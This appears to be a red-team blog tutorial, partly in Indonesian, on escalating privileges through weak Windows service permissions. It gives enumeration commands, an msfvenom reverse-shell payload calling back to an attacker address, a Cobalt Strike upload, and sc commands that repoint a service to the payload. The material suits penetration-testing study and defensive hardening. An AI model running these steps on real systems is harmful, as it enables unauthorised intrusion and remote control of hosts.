---
title: '[Misconfig] Weak Service Permissions'
date: 2023-07-25 22:54:22 +0700
categories: [Privilege Escalation, Windows Privilege Escalation]
tags: [red team, privilege escalation, what is, windows hacking, windows privilege escalation, service exploit, misconfig]        # TAG names should always be lowercase
author: nairpaa
---


**Weak Service Permissions** mengacu pada kelemahan atau kerentanan dalam konfigurasi izin (*permissions*) yang diberikan pada Windows *service*. 

*Permission* yang tidak tepat dapat menyebabkan *service* dapat dimanipulasi oleh pengguna yang tidak seharusnya memiliki akses ke layanan tersebut. 

Dalam konteks *privilege escalation,* ini dapat menjadi celah yang dimanfaatkan oleh penyerang untuk mendapatkan hak istimewa yang lebih tinggi.

## 0x1 - Exploitation Stages

### Step 1: Check the Service Permission

**Tools**:
- [Get-ServiceAcl.ps1](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/)

```powershell
# SharpUp
PS > .\SharpUp.exe audit ModifiableServices

# Get-ServiceAcl.ps1
PS > . .\Get-ServiceAcl.ps1
PS > Get-ServiceAcl -Name VulnService2 | select -expand Access

# PowerUp.ps1
PS > . .\PowerUp.ps1
PS > Get-ModifiableServiceFile

# WinPEAS
PS > .\winpeas.exe
```

### Step 2: Create Malware and Upload

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```powershell
# Contoh upload file pada Cobalt Strike
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
```

### Step 3: Change the Service Config

```powershell
# Mengubah binary path service
C:\> sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
```

### Step 4: Run the Service

```powershell
C:\> sc qc VulnService2
C:\> sc stop VulnService2 
C:\> sc start VulnService2 
```

---

## 0x2 - References

- https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
- https://pentestlab.blog/2017/03/30/weak-service-permissions/
- https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions